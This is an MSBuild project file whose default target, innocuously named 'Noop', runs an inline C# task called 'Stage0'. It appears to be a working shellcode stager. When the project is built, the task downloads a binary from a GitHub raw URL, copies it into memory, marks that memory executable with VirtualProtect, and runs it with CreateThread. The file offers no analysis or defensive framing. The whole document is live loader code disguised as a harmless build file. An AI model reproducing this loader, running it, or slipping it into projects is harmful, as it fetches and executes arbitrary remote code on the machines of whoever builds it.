<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" DefaultTargets="Noop">
  <UsingTask TaskName="Stage0" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
    <ParameterGroup>
      <Url ParameterType="System.String" Required="true" />
    </ParameterGroup>
    <Task>
      <Using Namespace="System" />
      <Using Namespace="System.Net.Http" />
      <Using Namespace="System.Runtime.InteropServices" />
      <Using Namespace="System.Threading.Tasks" />
      <Code Type="Class" Language="cs"><![CDATA[
using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class Stage0 : Task
{
    [Required] public string Url { get; set; }

    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
    [DllImport("kernel32.dll")] static extern bool VirtualFree(IntPtr a, UIntPtr s, uint t);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a, UIntPtr s, IntPtr f, IntPtr p, uint c, out uint i);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint m);

    public override bool Execute()
    {
        try {
            byte[] sc;
            using (var hc = new HttpClient()) {
                hc.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0");
                sc = hc.GetByteArrayAsync(Url).GetAwaiter().GetResult();
            }
            if (sc == null || sc.Length == 0) return false;

            IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, 0x3000, 0x04); // MEM_COMMIT|RESERVE, PAGE_READWRITE
            Marshal.Copy(sc, 0, mem, sc.Length);
            Array.Clear(sc, 0, sc.Length);

            uint old;
            VirtualProtect(mem, (UIntPtr)sc.Length, 0x20, out old); // PAGE_EXECUTE_READ

            uint tid;
            IntPtr th = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid);
            if (th == IntPtr.Zero) return false;

            WaitForSingleObject(th, 0xFFFFFFFF);
            VirtualFree(mem, UIntPtr.Zero, 0x8000);
            return true;
        } catch { return false; }
    }
}
]]></Code>
    </Task>
  </UsingTask>

  <Target Name="Noop">
    <Stage0 Url="https://github.com/kevospoofgf-dotcom/storagex64/raw/refs/heads/main/x64.bin" />
  </Target>
</Project>
